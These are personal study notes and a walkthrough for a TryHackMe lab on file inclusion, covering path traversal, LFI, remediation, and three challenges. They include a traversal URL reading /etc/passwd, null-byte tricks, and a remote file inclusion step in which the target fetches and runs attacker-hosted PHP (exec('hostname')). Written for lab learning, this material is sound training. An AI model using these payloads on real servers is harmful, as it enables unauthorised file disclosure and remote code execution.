---
source: https://tryhackme.com/room/fileinc
---
Web pages often request a variety of files - .html, .css, .js, etc. - and certain **query parameters** are attached to a URL to retrieve data or perform actions based on user input

![[./_resources/File_Inclusion.resources/unknown_filename.png]]

**Vulnerabilities**

* input validation is a common vulnerability, where an attacker can pass harmful data into a web application 

**Path Traversal (Directory Traversal)**

* a vulnerability allowing an attacker to read system resources using the URL
* ![[./_resources/File_Inclusion.resources/unknown_filename.1.png]]
* path traversal is also known as **dot-slash-attacks**, as moving to a directory one step up involves **../**
	* an attacker can send a url like  <http://webapp.thm/get.php?file=../../../../etc/passwd> to gain access to sensitive data
* ![[./_resources/File_Inclusion.resources/unknown_filename.2.png]]
* in PHP, a common function to get the contents of a file is **file\_get\_contents**

**LFI (Local File Inclusion)**

	

**Remediation**

1. Keep system and services, including web application frameworks, updated with the latest version.
	
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow\_url\_fopen on and allow\_url\_include.
	
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
	
7. Implement whitelisting for file names and locations as well as blacklisting.

**File Inclusion Challenge**

**Challenge 1**

![[./_resources/File_Inclusion.resources/image.png]]

* so, we need to find a way to both send a POST request to the web page but also consider the parameters of the form

1. we'll  use **curl** for this exercise - **there are multiple ways to set up the curl arguments, we'll go through two**
2. one way is by using -X argument to include the POST request: curl -X POST <http://10.10.250.89/challenges/chall1.php>
3. we could also forgo the -X argument all together and just use the -d argument (noted below)
4. we need to look at the form itself to see what it's doing, so now we right-click the "Include" button and select **Inspect Element**
5. ![[./_resources/File_Inclusion.resources/image.1.png]]
6. so we see the button itself has a GET request and the **file** parameter, which we  need to change in order to access our flag
7. we append our curl command to include the -d argument, which sends data to our request
8. given that we need to send both a POST request and change the "file" parameter, we could forgo the -X argument and send curl http://10.10.250.89/challenges/chall1.php -d "method=POST&file=/etc/flag1"

* we could also keep the -X POST argument and either keep the above -d argument as-is or even keep the method as GET, as the -X POST argument would override the data passed in the -d argument

1. the above will allow us to see the flag for this challenge:
	* ![[./_resources/File_Inclusion.resources/image.2.png]]

**Challenge 2**

![[./_resources/File_Inclusion.resources/image.3.png]]

1. we are going to use Burp suite for this task as it will allow us to stop, edit, and forward requests made to the webpage
2. Upon refresh, we see that the above page only allows Admins access
3. ![[./_resources/File_Inclusion.resources/image.4.png]]
4. so, in order to gain admin access we can reload the page, enter Burp, and alter some credentials
5. line 8 is changed to Admin
6. ![[./_resources/File_Inclusion.resources/image.5.png]]
7. ![[./_resources/File_Inclusion.resources/image.6.png]]
8. this does not give us the flag, but it does show us how to get it
9. we can try alter line 8 again to try taking us to /etc/flag2
10. ![[./_resources/File_Inclusion.resources/image.7.png]]
11. we find out we've sent an extra forward slash at the beginning of /etc
12. ![[./_resources/File_Inclusion.resources/image.8.png]]
13. reload the page, remove the beginning forward slash and try again
14. ![[./_resources/File_Inclusion.resources/image.9.png]]
15. now that we have gotten rid of the error, we can try to traverse the file system to find /etc/flag2 and the flag; we do this by further appending line 8
16. ![[./_resources/File_Inclusion.resources/image.10.png]]
17. well, the above got us somewhere, but we should look at the **.php** at the end of the flag; this tells us we could try using a **null byte - %00** to further expose information - we append line 8 again with this null byte
18. ![[./_resources/File_Inclusion.resources/image.11.png]]
19. the  null byte tricks the web page into ignoring whatever comes after the null byte, allowing us to pass in more data than the web page would otherwise allow

**Challenge 3**

**Playground**

1. we initially are greeted with a page asking  us to input a file in a form
2. ![[./_resources/File_Inclusion.resources/unknown_filename.3.png]]
3. because this exercise is about **remote file inclusion**, we need to make sure we give the page a parameter that points back to our webpage
4. specifically, we want the **include()** function to take our nefarious URL and download and execute the code at our attack page
5. ![[./_resources/File_Inclusion.resources/unknown_filename.4.png]]
6. **<?php print exec('hostname'); ?>** is the code we want to execute
7. we now need to simulate being a website with the malicious file, **cmd.txt**, with the above code
8. we start a web server in python:  **python -m http.server**
9. now that we have a server running on our computer, we need to pull up our systems's IP address via **ifconfig (Linux) or ipconfig (Windows)**
10. we now have a server, a location, and a file to feed the Playground website
11. we append **?file=http://\[machine IP address\]/playground.php?file=http://\[our local machine IP address\]/cmd.txt**
